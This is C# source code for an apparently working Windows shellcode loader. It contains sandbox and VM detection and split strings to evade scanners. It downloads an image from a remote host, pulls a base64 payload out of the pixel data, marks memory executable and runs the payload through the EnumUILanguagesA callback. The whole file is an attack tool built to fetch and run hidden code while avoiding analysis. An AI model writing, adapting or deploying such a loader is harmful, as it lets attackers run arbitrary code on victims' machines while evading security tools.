using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace qwq
{
    class Program
    {
        static void Main()
        {
            if (Program.IsServerVersion() || !Program.VM())
            {
                AppDomain tempDomain = AppDomain.CreateDomain("TempDomain");
                tempDomain.DoCallBack(Load);
            }
        }

        public static bool IsServerVersion()
        {
            return (from o in new ManagementObjectSearcher("SELECT * FROM Win32_Oper" + "atingSystem").Get().OfType<ManagementObject>()
                    select (uint)o.GetPropertyValue("ProductType")).First<uint>() != 1U;
        }

        public static bool VM()
        {
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_C" + "acheMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
            {
                i++;
            }
            return (i == 0);
        }

        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);


        public static byte[] depixelate(Bitmap img)
        {
            StringBuilder holder = new StringBuilder();
            int xmax = img.Width - 1;
            int ymax = img.Height - 1;
            for (int y = 1; y <= ymax; y++)
            {
                for (int x = 1; x <= xmax; x++)
                {
                    Color c = img.GetPixel(x, y);
                    holder.Append((char)c.R);
                }
            }

            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
        }
        private static void Load()
        {
            object mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, 0, 1000, 0x00002000 | 0x00001000, 0x40, 0);

            if (mem != null)
            {
                System.Windows.Forms.MessageBox.Show("Test");
                string file = @"www.baidu.comaaa"; //File
                var requestFile = WebRequest.Create(file);
                Bitmap fileIMG;

                using (var response = requestFile.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    fileIMG = (Bitmap)Image.FromStream(stream);
                }
                Process.GetCurrentProcess();
                byte[] outputFile = depixelate(fileIMG);
                Process.GetCurrentProcess();
                IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)outputFile.Length, AllocationType.Commit, MemoryProtection.PAGE_READWRITE);
                MemoryProtection    outpro;
                Process.GetCurrentProcess();
                VirtualProtect(p, (uint)outputFile.Length, MemoryProtection.ExecuteReadWrite, out outpro);
                Process.GetCurrentProcess();
                RtlMoveMemory(p, outputFile, (uint)outputFile.Length);
                EnumUILanguagesA(p, 0, IntPtr.Zero);
            }
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040,
            PAGE_READWRITE=0x04 
        }
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernelbase.dll")]
        public static extern bool  VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect,out MemoryProtection lpflOldProtect);
        [DllImport("kernel32.dll")]
        private static extern bool EnumUILanguagesA(IntPtr lpUILanguageEnumProc, uint dwFlags, IntPtr lParam);

    }
}